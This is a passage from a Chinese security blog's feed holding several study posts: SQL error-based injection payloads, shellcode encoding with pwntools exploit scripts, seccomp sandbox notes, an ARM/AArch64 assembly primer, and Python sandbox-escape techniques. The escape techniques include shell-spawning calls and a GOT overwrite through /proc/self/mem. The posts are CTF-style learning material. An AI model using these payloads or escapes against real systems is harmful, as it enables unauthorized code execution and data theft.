floor报错注入准确地说应该是floor,count,group by冲突报错. floor(x)返回不大于x的最大整数值. rand()返回一个0-1之间的随机数.rand()在ORDER BY和GROUP BY子句中会被执行多次. 1select count(*), (floor(rand(0) * 2)) as x from information_schema.tables group by x count(*)与group by在一起时的工作机制. 建立一个虚拟表,两列:key和count(*). 查询数据,在虚拟表中寻找是否已经存在数据(key),存在则对应行的count(*)加一,不存在则插入数据并设置count(*)为一. 对查询字段循环第二步. 由于floor(rand(0) * 2)会产生两个伪随机的值,且值序列开头为011011.对应的虚拟表建立过程就是. 查询到0,查虚拟表发现无,插入key = 1. 查询到1,查虚拟表发现有,1对应count(*)加一变成2. 查询到0,查虚拟表发现无,插入key = 1失败(key为主键)报错. 可以通过以下payload获取想要的信息. 1select count(), concat((select database()), '-', floor(rand(0)2)) as a from information_schema.tables group by a; Oracle注入 Oracle是甲骨文公司的一款关系数据库管理系统. Oracle有数据字典和数据字典视图. 数据字典是元数据的集合,从逻辑上和物理上描述了数据库及内容,存储于SYSTEM与SYSAUX表空间内的若干段 数据字典视图:分为三类:USER,ALL,DBA.以前辍来区分,不同类拥有不同的权限.USER:用户所拥有的对象信息;ALL:用户能访问的对象信息;DBA:整个数据库中的对象信息. 例如:user_tables表中存储用户拥有的表的信息,user_tab_columns表中存储用户拥有的列的信息. Dual是Oracle中的一个实际存在的表,任何用户均可读取,常用在没有目标表的select语句块中查看当前连接用户. 联合查询注入与MySQL操作类似.注意:Oracle会自动将小写转换为大写. SQL Server注入 SQL Server是Microsoft公司推出的关系型数据库管理系统. SQL Server 2005引入了一组目录视图作为保留系统元数据的通用接口. 所有目录视图(包括动态管理对象和兼容性视图)都在sys模式中,访问对象时必须引入模式名称. sys.databases:存放数据库相关的信息.安装SQL Server时,sys.databases包含master,model,msdb,mssqlweb和tempdb数据库的项.该表存储在master数据库中. sys.objects:存放数据库创建的所有对象.如约束,默认值,日志,规则,存储过程等,每个对象在表中占一行.Name,id,xtype,uid,status分别是对象名,对象ID,对象类型,所有者对象的用户ID,对象状态. sys.columns:每个表和视图中的每列在该表中占一行,存储过程中的每个参数在该表中也占一行.name,id,colid分别是字段名称,表ID号,字段ID号. 报错注入 利用关系运算符的类型转化:(select top 1 name from sys.databases) &gt; 0,db_name() &gt; 0.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-shellcode编写]]></title>
    <url>%2Fposts%2F4313c77e%2F</url>
    <content type="text"><![CDATA[字符检测绕过 有时候程序会对输入进行一些可打印检查,导致平常的shellcode失效,这个时候需要对shellcode进行编码. 可打印检查一般分为Alphanumeric(字符在[A-Za-z0-9]区间)和Printable(字符的ascii码在0x1f和0x7f区间,不包含边界). Printable x86 x86下可以使用msf内置的encoder. 1234567msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/sh" -e x86/alpha_upper BufferRegister=eax#可以直接生成shellcode,BufferRegister是指向shellcode的寄存器.#如果不声明BufferRegister,生成的shellcode会有额外的几条并不是可打印字符的指令来确定shellcode的位置.#x86/alpha_mixed这个encoder也可.x86/unicode_mixed与x86/unicode_upper用于宽字节的情况.cat shellcode | msfvenom -a x86 --platform linux -e x86/alpha_upper BufferRegister=eax#也可以用msf来编码已有的shellcode Printable x86-64 目前手动编比较靠谱. 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.arch = "amd64"context.log_level = "debug"r = process("./chall3")gdb.attach(r)payload = ''' push rax pop rdi push r15 pop rsi push r15 push r15 push r15 push r15 pop rsi pop rsi pop rsi pop rsi push 0x60 pop rdx sub byte ptr [rax + 0x2a], dl sub byte ptr [rax + 0x2a], dl sub byte ptr [rax + 0x2b], dl sub byte ptr [rax + 0x2d], dl sub byte ptr [rax + 0x2e], dl push r15 pop rdx push 0x3b pop rax'''#r15 = 0#rax = &amp;shellcodepayload = asm(payload)print hex(len(payload))payload += "\x48\x43\x27\x2f\x6f\x65/bin/sh"r.send(payload)r.interactive() 一个不太靠谱的工具:https://github.com/ecx86/shellcode_encoder. UnPrintable x86 123456789101112131415161718192021222324252627282930from pwn import *context.arch = "i386"context.log_level = "debug"r = process("./pwn")gdb.attach(r, "b * 0x80485F0\nc")payload = ''' mov edx, 0xff mov edx, 0xff mov edx, 0xff mov edx, 0xff mov edx, 0xff mov ecx, 0x804A08a mov ebx, 0 mov eax, 3 int 0x80'''#rax = &amp;shellcodepayload = asm(payload)print hex(len(payload))payload = payload.ljust(0x100, "\x00")r.send(payload)payload = asm(shellcraft.sh())r.send(payload)r.interactive() tips 编写ARM的shellcode时,使用Thumb指令代替ARM指令可以避免在指令中出现\0截断.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-沙箱机制]]></title>
    <url>%2Fposts%2F598ab275%2F</url>
    <content type="text"><![CDATA[沙箱机制 沙箱(Sandbox)是一种程序的隔离运行机制,其目的是限制不可信进程或不可信代码运行时的访问权限. seccomp是一种内核中的安全机制,通过seccomp可以在程序中禁用掉某些syscall. seccomp规则的设置可以使用prtcl函数和seccomp函数族. prctl函数 12#include &lt;sys/prctl.h&gt;extern int prctl (int __option, ...) __THROW; prctl函数功能主要看option参数,其中与seccomp机制相关的有:PR_SET_NO_NEW_PRIVS(38),PR_SET_SECCOMP(22).其中prctl(38, 1, 0, 0, 0);表示禁用系统调用. prctl(22, arg2, arg3)根据arg2有两种情况. arg2 == 1(SECCOMP_MODE_STRICT)表示允许的系统调用为read,write,exit(非exit_group)和sigreturn. arg2 == 2(SECCOMP_MODE_FILTER)表示允许的系统调用由arg3指向sock_fprog结构体定义,该结构体的成员指向的sock_filter结构体可以定义过滤任意系统调用和系统调用参数. 1234567891011struct sock_filter &#123; /* Filter block */ __u16 code; /* Actual filter code */ __u8 jt; /* Jump true */ __u8 jf; /* Jump false */ __u32 k; /* Generic multiuse field */&#125;;struct sock_fprog &#123; /* Required for SO_ATTACH_FILTER. */ unsigned short len; /* Number of filter blocks */ struct sock_filter __user *filter;&#125;; 如果可以覆盖sock_filter结构体就可以控制沙箱规则. seccomp-tools sock_filter结构体内容的编写可以通过seccomp-tools完成. seccomp-tools常用命令. 1234#查看程序seccomp规则,需要运行程序到规则生效.seccomp-tools dump ./pwn#将自定义的规则转成结构体形式.seccomp-tools asm myRule.asm -f raw | seccomp-tools disasm - 沙箱规则编写示例. 123456789#myRule.asmA = archA = sys_numberA = args[0]A == 666 ? dead : nextallow:return ALLOWdead:return ERRNO(0) seccomp函数族 编译选项:-lseccomp,需要安装对应依赖库. 1234scmp_filter_ctx ctx;ctx = seccomp_init(SCMP_ACT_ALLOW);seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);seccomp_load(ctx); typedef void *scmp_filter_ctx;,实际上ctx就是个指针. seccomp_init根据参数返回一个指向规则结构体的指针. 1234#define SCMP_ACT_ALLOW 0x7fff0000U//表示默认允许所有的syscacll#define SCMP_ACT_KILL 0x00000000U//表示默认禁止所有的syscall seccomp_rule_add根据参数添加规则. 第二个参数SCMP_ACT_KILL表示禁止,SCMP_ACT_ALLOW表示允许. 第三个参数指定规则针对的系统调用号. 第四个参数表示是否限制参数.如:seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 1, SCMP_A2(SCMP_CMP_EQ, 0));表示禁止第三个参数为0的execve调用. seccomp_load根据参数应用规则.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-assembly-ARM-基础]]></title>
    <url>%2Fposts%2Ff6dfed73%2F</url>
    <content type="text"><![CDATA[简介 ARM架构是一个精简指令集RISC处理器架构家族,拥有一套精简的指令集以及比CISC处理器更多的通用寄存器. ARM指令只处理寄存器中的数据,只有load/store指令可以读/写存储器. ARM架构的优势是指令可以被更快的执行,同时RISC处理器通过引入流水线机制,减少每个指令的占用的CPU的时钟周期来缩短执行时间. 工作状态 ARM处理器有两种工作状态ARM和Thumb. 两种工作状态之间最大的差异是指令集,ARM状态的指令长度为32位且字对齐,Thumb状态的指令长度一般为16位且半字对齐,也可能为32位,ARM中的字为四字节,半字为两字节. Thumb 不同的ARM版本,支持的Thumb指令集并不相同. Thumb-1(16位指令):用于ARMv6和更早的版本. Thumb-2(16位和32位指令):对Thumb-1的扩展,添加了更多指令并允许它们为16位或32位宽,用于ARMv6T2,ARMv7. ThumbEE:在Thumb-2基础上包含了针对动态代码生成(代码在执行前或执行期间编译代码)的一些变更和补充,用于之后的版本. 不同的命名只是为了区分不同的版本.处理器只知道它运行在Thumb工作状态. ARM ARM和Thumb的区别. ARM工作状态下的所有指令都支持条件执行,而Thumb只有某些ARM处理器版本允许使用IT指令进行条件执行. 32位ARM和Thumb指令的区别为32位Thumb指令具有.w后缀. ARM工作状态下有一个特有的功能:桶形移位器,支持数据的各种移位操作,移位操作在ARM指令集中只能作为指令格式中的一个字段.例如:MOV R0, R1, LSL#2. 运行模式 ARM处理器支持7种运行模式. usr(用户模式):ARM处理器正常程序执行模式. fiq(快速中断模式):用于高速数据传输或通道处理. irq(外部中断模式):用于通用的中断处理. svc(管理模式):操作系统使用的保护模式. abt(数据访问终止模式):当数据或指令预取终止时进入该模式,可用于虚拟存储及存储保护. sys(系统模式):运行具有特权的操作系统任务. und(未定义指令中止模式):当执行未定义的指令时进入该模式,可用于支持硬件协处理器的软件仿真. ARM处理器的运行模式可以通过软件改变,也可以通过外部中断或异常处理改变. 除用户模式以外的所有6种模式称之为非用户模式,或特权模式(Privileged Modes). 除用户模式和系统模式以外的5种又称为异常模式(Exception Modes),常用于处理中断或异常,以及需要访问受保护的系统资源等情况. 寄存器 ARM微处理器共有37个32位寄存器,其中31个为通用寄存器,6个为状态寄存器. ARM处理器在每一种运行模式下均有一组相应的寄存器与之对应.在任意一种运行模式下,可访问的寄存器包括15个通用寄存器(R0~R14),一至二个状态寄存器和程序计数器. 通用寄存器(R0~R15)可分成不分组寄存器R0~R7,分组寄存器R8~R14和程序计数器R15. 不分组寄存器是真正的通用寄存器,在所有处理器模式下访问的都是同一个物理寄存器.分组寄存器取决于当前的处理器模式,每种模式有专用的分组寄存器用于快速异常处理. 寄存器R13通常用做堆栈指针SP;寄存器R14用作子程序链接寄存器,也称为LR,指向函数的返回地址;寄存器R15被用作程序计数器(PC). CPSR包含条件码标志,中断禁止位,当前处理器模式以及其它状态和控制信息.CPSR在每种异常模式下都有一个对应的程序状态保存寄存器SPSR. 当异常出现时,SPSR用于保存CPSR的值,以便异常返回后恢复工作状态. 指令集 ARM在不同工作状态下有不同的指令集,但助记符不变. 数据处理指令 指令标识符中的S决定指令的操作是否影响CPSR中条件标志位的值,没有S时指令不更新CPSR中的条件标志位. 1234567891011121314151617181920212223242526272829303132333435363738MOV&lt;condition&gt;&lt;S&gt; DEST, OP1;DEST=OP1,DEST是寄存器,OP1可以是寄存器,被移位的寄存器,或立即数.;DEST为R15时将修改程序计数器或标志.MOV PC, R14 =&gt; 退出到调用者;MOVS PC, R14 =&gt; 退出到调用者并恢复标志位.MVN&lt;condition&gt;&lt;S&gt; DEST, OP1;DEST=~OP1,DEST是寄存器,OP1可以是寄存器,被移位的寄存器,或立即数.ADD&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1+OP2,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.ADC&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1+OP2+CPSR.C,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.SUB&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1-OP2,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.SBC&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1+OP2-~CPSR.C,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.RSB&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP2-OP1,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.RSC&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP2-OP1-~CPSR,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.AND&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1&amp;OP2,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.ORR&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1|OP2,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.EOR&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1^OP2,DEST是寄存器,OP1是寄存器,OP2可以是寄存器,被移位的寄存器,或立即数.BIC&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1&amp;(~OP2),DEST是寄存器,OP1是寄存器,OP2是32位掩码.;BIC R0, R0, #%1011;清除R0中的位0,1,和3,其余的位保持不变.CMP&lt;condition&gt; OP1, OP2;同SUB,不存储结果,只更改条件标志位.CMN&lt;condition&gt; OP1, OP2;同SUB,但OP2改为~OP2,不存储结果,只更改条件标志位.TST&lt;condition&gt; OP1, OP2;同AND,不存储结果,只更改条件标志位.TEQ&lt;condition&gt; OP1, OP2;同EOR,不存储结果,只更改条件标志位. 移位指令 ARM处理器设置与数据处理指令一起使用的桶式移位器(barrel shifter),也可以使用桶式移位器影响LDR/STR操作中的变址值. 移位操作在ARM指令集中不作为单独的指令使用,如果数据处理指令的第二个操作数或者单一数据传送指令中的变址是寄存器,则可以对它进行各种移位操作. LSL,逻辑左移;ASL,算术左移;LSR,逻辑右移;ASR,算术右移;ROR,循环右移;RRX,带扩展的循环右移.可以用一个立即值(0 ~ 31)指定移位数量,或用包含0 ~ 31值的寄存器指定移位数量. 指令标识符中的S决定指令的移出位是否设为进位标志的值,有则设置,否则移出位抛弃. 1234567891011121314Rn, LSL #n;Rn=Rn&lt;&lt;n.最低有效位用零来填充.Rn, ASL #n;同上.Rn, LSL Rx;Rn=Rn&lt;&lt;Rx.最低有效位用零来填充.Rn, ASL Rx;同上.Rn, LSR #n;Rn=Rn&gt;&gt;n.最高有效位用零来填充.Rn, LSR Rx;Rn=Rn&gt;&gt;Rx.最高有效位用零来填充.Rn, ASR #n;Rn=Rn&gt;&gt;n.最高有效位用第31位的值来填充.Rn, ASR Rx;Rn=Rn&gt;&gt;Rx.最高有效位用第31位的值来填充.Rn, ROR #n;循环右移类似于逻辑右移,但是最高有效位用移出位填充.Rn, ROR Rx;同上,移位量为32的操作将导致输出与输入完全一致.Rx, RRX;Rx的位向右移动一个位置,移动时会使用处理器的进位标志来提供一个要被移位的数量,也就是参与移位的有33个位. 加载/存储指令 12345678LDR&lt;condition&gt;(B/H) Rd, ADDR;用于从存储器中将一个32(8/16)位的字数据传送到目的寄存器中.STR&lt;condition&gt;(B/H) Rd, ADDR;用于从源寄存器中将一个32(8/16)位的字数据传送到存储器中.;批量数据加载/存储指令指令LDM/STM&lt;condition&gt;&lt;type&gt; Rd!, &#123;Rd2, ...&#125;;type:IA,每次传送后地址加1;IB,每次传送前地址加1;DA,每次传送后地址减1;DB,每次传送前地址减1;FD,满递减堆栈;ED,空递减堆栈;FA,满递增堆栈;EA,空递增堆栈; 乘法指令 1234MUL&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2;DEST=OP1*OP2.DEST为R15之外的简单寄存器,DEST和OP1必须是不同的寄存器,所有OP必须为简单寄存器.MLA&lt;condition&gt;&lt;S&gt; DEST, OP1, OP2, OP3;DEST=(OP1*OP2)+OP3.DEST为R15之外的简单寄存器,DEST和OP1必须是不同的寄存器,所有OP必须为简单寄存器. 跳转指令 跳转指令用于实现程序流程的跳转.addr的值由寄存器R0~R15提供. 存储在跳转指令中的实际值是相对当前R15(PC)的一个偏移量(24位有符号数),左移两位后有符号扩展为32位,表示的有效偏移为26位(+/-32M). 12345678B&lt;condition&gt; ADDR;R15=R15+ADDR.BL&lt;condition&gt; ADDR;MOV R14, R15;R15=R15+ADDR.BLX addr;ARM工作状态使用,跳转到指令中所指定的目标地址,并切换到Thumb工作状态,该指令同时将PC的当前内容保存到寄存器R14中.BX&lt;condition&gt; addr;跳转到指令中所指定的目标地址,状态切换是由addr的最低位来指定的,如果等于0,进入ARM工作状态,如果为1,则进入Thumb工作状态. ARM中还有一种实现程序流程的跳转,直接向程序计数器PC写入跳转地址值,跳转之前保存返回地址从而实现子程序调用. 状态寄存器访问指令 123456MRS&lt;condition&gt; Rd, CPSR/SPSR;用于将程序状态寄存器的内容传送到通用寄存器中.MSR&lt;condition&gt; CPSR/SPSR(_f/s/x/c), Rd/num;用于将操作数的内容传送到程序状态寄存器的特定域/整个.;32位的程序状态寄存器可分为4个域:位[31:24]为条件标志位域,用f表示;位[23:16]为状态位域,用s表示;位[15:8]为扩展位域,用x表示;位[7:0]为控制位域,用c表示; 异常产生指令 12345SWI&lt;condition&gt; num;用于产生软件中断,访问操作系统例程或第三方生产的模块,num表示SWI编号(24bit).相关参数通过通用寄存器传递.当指令中24位的立即数被忽略时,SWI编号由通用寄存器R0的内容决定.BKPT num;ARMv5T之后加入的中断指令,用于产生软件断点中断,可用于程序的调试,16bit num. ARM通过SWI让程序陷入内核进行系统调用.SWI指令用于产生软件中断,从而切换到管理模式,CPSR保存到管理模式的SPSR,跳转到SWI向量.在其他模式下也可使用SWI指令切换到管理模式. 调用号:https://elixir.bootlin.com/linux/v2.6.32/source/arch/arm/include/asm/unistd.h. 异常处理函数(SWI向量)使用下面指令获取24位调用号:LDR R0, [LR, #-4]; BIC R0, R0, #0xFF000000.通过对SPSR访问确定软中断的SWI指令是ARM指令还是Thumb指令. 条件代码 ARM对所有指令提供了条件执行,条件代码如下. EQ:等于,如果设置了Z标志. NE:不等于,如果清除了Z标志. VS:溢出,如果设置了V标志. VC:未溢出,如果清除了V标志. HI:高于(无符号),如果设置了C标志并清除了Z标志. LS:低于或等于(无符号),如果清除了C标志或设置了Z标志. PL:非负数,如果清除了N标志. MI:负数,如果设置了N标志. CS:进位,如果设置了C标志. CC:未进位,如果清除了C标志. GE:大于或等于(有符号),如果设置了N标志并设置了V标志,或者清除了N标志并清除了V标志. GT:大于(有符号),满足GE的同时清除了Z标志. LE:小于或等于(有符号),如果设置了N标志并清除了V标志,或者清除了N标志并设置了V标志.满足前面的同时设置了Z标志. LT:小于(有符号),如果设置了N标志并清除了V标志,或者清除了N标志并设置了V标志. AL:总是. NV:从不. ARMv8 ARMv8的架构继承以往ARMv7与之前处理器技术的基础,除了现有的16/32bit的Thumb2指令支持外,也向前兼容现有的A32(ARM 32bit)指令集,称为AArch32,引入了64bit的AArch64架构. 除了新增A64(ARM 64bit)指令集外,也扩充了现有的A32(ARM 32bit)和T32(Thumb2 32bit)指令集(二者统称AArch32 ISA),另外还新增加了CRYPTO(加密)模块支持。 ARMv8提供AArch32 state和AArch64 state两种Execution State. ARMv8新增了两种运行模式:hyp,用于虚拟化扩展;monitor,用于Security扩展. ARMv8异常级别 Armv8架构定义了四个异常级别EL0 ~ EL3:EL0对应应用程序,EL1对应操作系统内核,EL2对应Hypervisor,EL3对应安全监控模式,实现EL0和EL1的Secure和Non-Secure之间的切换,可起到物理屏障安全隔离作用. 发生异常时可以保留异常级别或者提升异常级别,从异常退出可以保留异常级别或者降低异常级别. 当从低异常级别陷入高异常级别,可以保持执行状态也可以从AArch32变为AArch64.当从高异常级别返回低异常级别,可以保持执行状态也可以从AArch64变为AArch32. ARMv8运行模式与异常等级之间的关系 user模式:只能在EL0执行. monitor模式:只能在Secure的EL3执行. hyp模式:只能在Non-Secure的EL2执行,虚拟机. system,supervisor,abort,undefined,IRQ,FIQ模式:依赖于Secure模式. Execution State AArch32 state 提供13个32bit通用寄存器R0 - R12,一个32bit的PC指针(R15),堆栈指针SP(R13),链接寄存器LR(R14).提供一个32bit异常链接寄存器ELR,用于hyp mode下的异常返回. 提供32个64bit的SIMD向量和标量floating-point支持.提供两个指令集A32,T32.兼容ARMv7的异常模型.协处理器只支持CP10\CP11\CP14\CP15. AArch64 state 提供31个64bit通用寄存器X0 - X30(W0 - W30),其中X30是程序链接寄存器LR.提供一个64bit的PC指针,堆栈指针SPx,异常链接寄存器ELRx. 提供32个128bit的SIMD向量和标量floating-point支持.定义ARMv8异常等级ELx.定义一组PE state寄存器PSTATE(NZCV/DAIF/CurrentEL/SPSel等),用于保存PE当前的状态信息.没有协处理器概念. 决定Execution State的条件 SPSR_EL1.M[4]决定EL0的执行状态,为0 =&gt; 64bit,1 =&gt; 32bit. HCR_EL2.RW决定EL1的执行状态,为1 =&gt; 64bit,0 =&gt; 32bit. SCR_EL3.RW确定EL2或EL1的执行状态,为1 =&gt; 64bit,0 =&gt; 32bit. AArch32和AArch64之间的切换只能通过发生异常或者系统Reset来实现.(A32与T32之间是通过BX指令切换的). 寄存器 AArch64有31个通用的64位寄存器,系统运行在64位状态下的时候名字叫Xn,运行在32位的时候就叫Wn. 32个128bits浮点寄存器(v0 - v31),可以通过Bn(8位),Hn(16位),Sn(32位),Dn(64位),Qn(128位)来访问不同的位数. 还有4个堆栈指针寄存器SP_EL0,SP_EL1,SP_EL2,SP_EL3(64位,还有32位的WSP). 3个异常链接寄存器ELR_EL1,ELR_EL2,ELR_EL3(64位). 3个存储状态寄存器SPSR_EL1,SPSR_EL2,SPSR_EL3(32位). 状态寄存器CPSR.一个程序计数器PC(64位). 还有Zero register(WZR 32bits,XZR 64bits). 当在指令中使用32位的寄存器时,源寄存器高32位会被忽略,目的寄存器高32位置零. 通用寄存器分为4组. 参数寄存器(X0 - X7):用作临时寄存器或可以保存的调用者保存的寄存器变量函数内的中间值,调用其他函数之间的值(可用于传递参数). 调用者保护寄存器(X9 - X15):如果调用者要求在任何这些寄存器中保留值调用另一个函数,调用者必须将受影响的寄存器保存在自己的堆栈中.它们可以通过被调用的子程序进行修改,而无需保存并在返回调用者之前恢复它们. 被调用者保存的寄存器(X19 - X29):这些寄存器保存在被调用者帧中,它们可以被被调用者修改子程序,只要它们在返回之前保存并恢复. 特殊用途寄存器(X8,X16 - X18,X29,X30). X8:是间接结果寄存器,用于保存子程序返回地址,尽量不使用. X16和X17:程序内调用临时寄存器. X18:平台寄存器,保留用于平台ABI,尽量不使用. X29:帧指针寄存器(FP),指向当前栈帧栈底. X30:链接寄存器(LR),存储着函数的返回地址. X31:堆栈指针寄存器SP或零寄存器XZR. AArch64状态有两种链接寄存器:LR和ELR. 通常LR(X30)用来存储子程序的返回地址,同一异常级别的子程序调用的返回地址存储在LR. ELR在陷入异常(出现级别提升)时用来存储返回地址,例如EL0到EL1时返回地址就会存储在ELR_EL1. 指令集 AArch64指令集特点. 移除了LDM/STM,PUSH/POP,使用STP/LDP代替. 没有提供访问CPSR的单一寄存器,但是提供访问PSTATE的状态域寄存器. 没有协处理器的概念,没有协处理器指令MCR,MRC. 少了很多条件执行指令,只有条件跳转和少数数据处理这类指令才有条件执行. 指令格式. 1234567&lt;Opcode&gt;&#123;&lt;Cond&gt;&#125;&lt;S&gt; &lt;Rd&gt;, &lt;Rn&gt;&#123;, &lt;Opcode2&gt;&#125;#Opcode:助记符#Cond:指令执行条件码#S:条件码设置项,决定本次指令执行是否影响PSTATE寄存器响应状态位值#Rd/Xt:目标寄存器.A32指令可以选择R0-R14,T32指令大部分只能选择RO-R7,A64指令可以选择X0-X30#Rn/Xn:第一个操作数的寄存器,同上,不同指令有不同要求；#Opcode2:第二个操作数,可以是立即数,寄存器Rm和寄存器移位方式(Rm, #shit) 加载/存储指令. 123456789LDR Rt, &lt;addr&gt;LDRB(8-bit, zero extended).LDRSB(8-bit, sign extended).LDRH(16-bit, zero extended).LDRSH(16-bit, sign extended).LDRSW(32-bit, sign extended).STR Rn, &lt;addr&gt;;同LDR 伪代码 AREA伪指令用于定义一个代码段或数据段:AREA 段名 属性1, 属性2, ...;段名若以数字开头,则该段名需用|括起来,如|1_test|. 常用的属性:CODE,用于定义代码段,默认为READONLY;DATA,用于定义数据段,默认为READWRITE;ALIGN=n,以2^n对齐,默认是按字对齐的; CODE16/CODE32.CODE16伪指令通知编译器,其后的指令序列为16位的Thumb指令;CODE32伪指令通知编译器,其后的指令序列为32位的ARM指令. ENTRY伪指令用于指定汇编程序的入口点.END伪指令用于通知编译器已经到了源程序的结尾. 函数调用 ARM和AArch64使用的是ATPCS(ARM-Thumb Procedure Call Standard)的函数调用约定. ARM的函数调用约定:函数的前4个参数分别保存在r0 ~ r3寄存器中,剩下的参数从右向左依次入栈,被调用者实现栈平衡,返回值保存在r0中. AArch64的函数调用约定:函数的前8个参数分别保存在x0 ~ x7寄存器中,剩下的参数从右往左一次入栈,被调用者实现栈平衡,返回值存放在x0中.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-escape-python沙箱逃逸]]></title>
    <url>%2Fposts%2F8722019b%2F</url>
    <content type="text"><![CDATA[简介 python沙箱,即以一定的方法模拟python终端. 而沙箱逃逸就是绕过python沙箱得限制实现命令执行. python基础 模块导入 1234567import pwnfrom pwn import *#该方法不能永久导入__import__('pwn').p64(1111)#导入的模块a中的另一个模块b可以用a.b或者a.__dict__["b"]间接访问模块b__import__('pwn').__dict__["elf"] 命令执行 一些可以实现命令执行的危险函数. 12345678910111213os.system('/bin/sh')os.popen('/etc/passwd')os.getcwd()commands.getstatusoutput('cat flag')#执行shell命令,返回执行的标准输出和标准错误.commands.getoutput('cat flag')#执行shell命令,返回执行的输出.subprocess.call('/bin/sh', shell = True)subprocess.Popen('cat flag', shell = True)pty.spawn('/bin/sh')execfile('/usr/lib/python2.7/os.py')#文件执行timeit.timeit("__import__('os').system('dir')", number = 1)eval('__import__("os").system("dir")')exec("os.system('cat flag')")print platform.popen('dir').read() 内置函数 python存在一些内置函数(即默认已经导入的函数),对应的内置模块__builtins__. 其中内置函数dir()在没有参数的时候返回本地作用域中的名称列表,有参数的时候返回参数对象的有效属性列表.可以通过dir(__builtins__)获取内置函数列表,然后通过dict引入模块,dict的作用是列出一个模组/类/对象下所有的属性和函数. 一个模块对象有一个由字典对象实现的命名空间,属性的引用会被转换为这个字典中的查找,例如:m.x等同于m.dict["x"]. 123#import __builtins____builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))#__import__('os') 如果一些内置函数被删除,可以通过reload(__builtins__)重新载入. 1del __builtins__.__dict__['execfile'] 在python3.x版本中,__builtin__变成了builtins模块,而且需要导入. object类基础函数 python的object类中集成了很多的基础函数,可以通过创建对象来引用. 寻找特殊模块的方法:__class__,获得当前对象的类;__bases__,列出其基类;__mro__,列出解析方法的调用顺序(即类的继承关系);__subclasses__(),返回子类列表;__dict__,列出当前属性/函数的字典;func_globals,返回一个包含函数全局变量的字典引用. 比如().__class__.__bases__[0].__subclasses__()[40]对应的是file类. 123().__class__.__bases__[0].__subclasses__()[40](r'C:\flag').read()().__class__.__bases__[0].__subclasses__()[40]('/tmp/hhh', 'w').write('123')().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("cat flag").read()') f修饰符 在PEP 498(python &gt; 3.6.0)中引入了新的字符串类型修饰符:f或F,用f修饰的字符串将可以执行代码.可以理解为字符串外层套了一个exec(). 123&gt;&gt;&gt; f'&#123;print("shaobaobaoer")&#125;'shaobaobaoer'None' 绕过思路 修改got表 实际上就是写/proc/self/mem内存镜像,通过覆写got表达到getshell的目的. 12(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at flag'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))#0x08de2b8是system@got的偏移,0x08de8c8是fopen@got的偏移. 间接引用 python中原生的import是存在被引用的,只要找到相关对象引用就可以避开沙箱的限制. 1print __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('c'+'at flag') __globals__属性是函数特有的属性,记录当前文件全局变量的值,包括导入的模块. 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls') 通过code构造函数 12345#localdef read(): return open("./poc.py",'r').read()read.__code__.co_code#'t\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S' 123456789101112131415161718#remotefunction_type = type(lambda: None)code_type = type((lambda: None).__code__)consts = (None, "./poc.py", 'r')bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'names = ('open', 'read')eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '&lt;module&gt;', 1, '', (), ()))#orimport __builtin__mydict = &#123;&#125;mydict['__builtins__'] = __builtin__codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '&lt;module&gt;', 1, '', (), ())function_type(codeobj, mydict, None, None, None)()#orftype = type(lambda: None)ctype = type((lambda: None).func_code)f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), &#123;&#125;)f(42) 字符编码或替换 .可替换为getattr(),例如:getattr(pwn, 